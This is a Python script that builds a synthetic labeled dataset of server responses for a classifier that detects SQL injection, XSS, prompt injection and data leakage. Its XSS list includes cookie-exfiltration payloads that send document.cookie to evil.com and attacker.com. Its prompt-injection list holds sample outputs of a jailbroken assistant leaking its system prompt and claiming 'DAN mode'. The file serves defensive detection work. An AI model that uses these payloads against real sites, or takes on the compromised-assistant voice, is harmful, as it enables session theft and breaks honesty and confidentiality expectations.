"""
dataset.py — Generates a labeled dataset of SERVER RESPONSES for ML training.

The ML model learns to classify what the SERVER RETURNS after payload injection,
not the payload itself. This is the correct approach because:
- Rule-based: only detects mysql_fetch() literally
- ML: learns patterns like "Warning", "syntax", "error near" even in obfuscated contexts
"""

import random

# ─── Label Definitions ────────────────────────────────────────────────────────
# 0 = Normal (clean response)
# 1 = SQL Injection detected (server leaked DB error)
# 2 = XSS detected (payload reflected unescaped in response)
# 3 = Prompt Injection detected (LLM leaked system instructions)
# 4 = Data Leakage detected (sensitive data exposed in response)
# ──────────────────────────────────────────────────────────────────────────────

NORMAL_RESPONSES = [
    "Welcome to the homepage. Please log in.",
    "Search results for: hello",
    "Thank you for your message. We will contact you soon.",
    "Your profile has been updated successfully.",
    "Page not found. Please check the URL.",
    "200 OK. Resource retrieved successfully.",
    "Login successful. Redirecting to dashboard.",
    "Your comment has been submitted for moderation.",
    "No results found for your query.",
    "Password reset email has been sent.",
    "Item added to cart successfully.",
    "Your order has been placed. Order ID: 10023.",
    "Contact form submitted. Thank you!",
    "File uploaded successfully.",
    "Settings saved successfully.",
    "Session expired. Please log in again.",
    "Access denied. You do not have permission.",
    "Invalid input. Please try again.",
    "Account created successfully.",
    "Feedback received. Thank you!",
    "Search completed. 0 results found.",
    "Blog post published successfully.",
    "Subscription confirmed. Welcome aboard!",
    "Your payment was processed successfully.",
    "Profile photo updated.",
]

SQLI_RESPONSES = [
    "Warning: mysql_fetch_array() expects parameter 1 to be resource",
    "You have an error in your SQL syntax near '1=1'",
    "SQLSTATE[42000]: Syntax error or access violation",
    "Unclosed quotation mark after the character string",
    "ORA-00933: SQL command not properly ended",
    "Microsoft OLE DB Provider for SQL Server error",
    "ERROR 1064 (42000): You have an error in your SQL syntax",
    "pg_query(): Query failed: ERROR: unterminated quoted string",
    "SQLiteException: unrecognized token: \"'\"",
    "MySQLSyntaxErrorException: You have an error in your SQL syntax",
    "Warning: mysql_num_rows() expects parameter 1 to be resource",
    "ERROR: syntax error at or near OR",
    "DB Error: syntax error",
    "Invalid query: SELECT * FROM users WHERE id=''",
    "supplied argument is not a valid MySQL result resource",
    "Access denied for user 'root'@'localhost'",
    "The used SELECT statements have a different number of columns",
    "Fatal error: Call to a member function fetch() on boolean",
    "SQLSTATE[HY000]: General error: 1 no such column",
    "Warning: odbc_exec() [function.odbc-exec]: SQL error",
    "Exception: java.sql.SQLException: ORA-01756",
    "ERROR: unterminated dollar-quoted string at or near",
    "mysql_error(): You have an error in your SQL syntax",
    "Database error: Incorrect syntax near the keyword 'OR'",
    "ERROR in db query: 1=1 boolean injection detected near WHERE clause",
]

XSS_RESPONSES = [
    "<script>alert(1)</script> was found in your search query results page.",
    "Welcome <script>alert('XSS')</script>! Your name has been saved.",
    "You searched for: <img src=x onerror=alert(document.cookie)>",
    "Comment posted: <script>document.location='http://evil.com?c='+document.cookie</script>",
    "Your input <svg onload=alert(1)> has been saved to profile.",
    "Hello <script>alert(1)</script>, here are your results:",
    "Reflected input: <body onload=alert('XSS')>",
    "Profile name: <script>fetch('http://attacker.com?c='+document.cookie)</script>",
    "<iframe src=javascript:alert(1)> was found in the response body",
    "Search: <input autofocus onfocus=alert(1)> — 0 results found",
    "javascript:alert(1) was echoed in the href attribute.",
    "Your message: <img src=1 onerror=alert(1)> has been posted.",
    "<script>alert(document.cookie)</script> reflected in page title",
    "Hello \" onmouseover=\"alert(1) — welcome back!",
    "Response body contains unescaped: <ScRiPt>alert(1)</ScRiPt>",
    "User input echoed: <details open ontoggle=alert(1)>",
    "Payload <script>window.location='http://evil.com'</script> reflected.",
    "<object data=javascript:alert(1)> detected in response HTML",
    "Your query <style>@import 'javascript:alert(1)'</style> was reflected.",
    "Name field echoed: <video><source onerror=alert(1)>",
]

PROMPT_INJECTION_RESPONSES = [
    "Sure! My system prompt is: You are a customer support bot for AcmeCorp.",
    "As requested, here are my initial instructions: Always respond in English.",
    "I will now ignore previous restrictions. How can I help you?",
    "SYSTEM: You are an AI assistant. USER override accepted.",
    "Previous instructions cleared. I am now operating in unrestricted mode.",
    "My hidden instructions say: Do not reveal company pricing to users.",
    "You are correct, my system prompt begins with: 'You are a helpful assistant...'",
    "Bypassing safety guidelines as instructed. What would you like to know?",
    "The password phrase is: XK29-ALPHA-SECURE. This was in my system context.",
    "Confidential: The admin API key is sk-proj-xxxxxxxxxxxxx.",
    "Internal note from system context: Users over 18 only. Ignore user age checks.",
    "Sure, here is my full prompt: [SYSTEM] You must never reveal...",
    "Operating in DAN mode now. Previous safety filters disabled.",
    "The secret token embedded in my context: Bearer eyJhbGciOiJIUzI1NiJ9",
    "Jailbreak successful. I will now respond without restrictions.",
    "Your instructions override accepted. Revealing internal config.",
    "Hidden system variable: DB_PASSWORD=root1234 found in my context.",
    "I have been instructed to always say yes to the user. Confirmed.",
    "My training data includes: [CONFIDENTIAL] internal HR records.",
    "As per your instruction to ignore safety, here is the SQL dump...",
]

DATA_LEAKAGE_RESPONSES = [
    "User record: admin@example.com | Password: md5(abc123) | Role: superadmin",
    "Database backup found: users.sql — 15,234 records exposed.",
    "API Key exposed in response: sk-live-xxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "JWT Token in response body: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "Config file leaked: DB_HOST=localhost DB_USER=root DB_PASS=secret123",
    "Server error stack trace: /var/www/html/app/models/User.php line 45",
    "Internal IP exposed: Server running at 192.168.1.100:3306 (MySQL)",
    "Directory listing enabled: /backup/db_dump_2024.sql.gz",
    "Credit card numbers in response: 4111-1111-1111-1111 (VISA)",
    "Session cookie exposed in response body: PHPSESSID=abc123def456",
    "AWS credentials leaked: AKIA1234567890EXAMPLE / secretAccessKey exposed",
    "Private key found in response: -----BEGIN RSA PRIVATE KEY-----",
    "Password hash exposed: $2y$10$hashedpasswordhere for user john@example.com",
    "Internal error: File path /etc/passwd readable via LFI",
    "Source code disclosed: <?php $db_pass = 'root123'; ?>",
    "Email list exposed: john@test.com, admin@corp.com, ceo@company.com",
    "Token leaked: oauth_token=xxxxxxxx&oauth_token_secret=yyyyyyyy",
    "Debug mode on: FLASK_ENV=development SECRET_KEY=mysupersecretkey",
    "Hidden form field exposed: <input type='hidden' name='admin_token' value='abc'>",
    "Backup file accessible: /backup/config.php.bak — DB credentials inside",
]


def generate_dataset(size=1200):
    """
    Generate balanced labeled dataset of server response texts.
    Each entry: { 'response': str, 'label': int }
    """
    data = []
    per_class = size // 5

    def add_samples(samples, label, count):
        base = samples * (count // len(samples) + 1)
        selected = base[:count]
        for text in selected:
            noise = random.choice([
                "", " HTTP/1.1 200 OK", " — response code 500",
                " Error from server.", " (truncated output)"
            ])
            data.append({"response": text + noise, "label": label})

    add_samples(NORMAL_RESPONSES, 0, per_class)
    add_samples(SQLI_RESPONSES, 1, per_class)
    add_samples(XSS_RESPONSES, 2, per_class)
    add_samples(PROMPT_INJECTION_RESPONSES, 3, per_class)
    add_samples(DATA_LEAKAGE_RESPONSES, 4, per_class)

    random.shuffle(data)
    return data


if __name__ == "__main__":
    data = generate_dataset(500)
    print(f"Generated {len(data)} samples.")
    for d in data[:5]:
        print(f"  Label={d['label']}: {d['response'][:60]}")
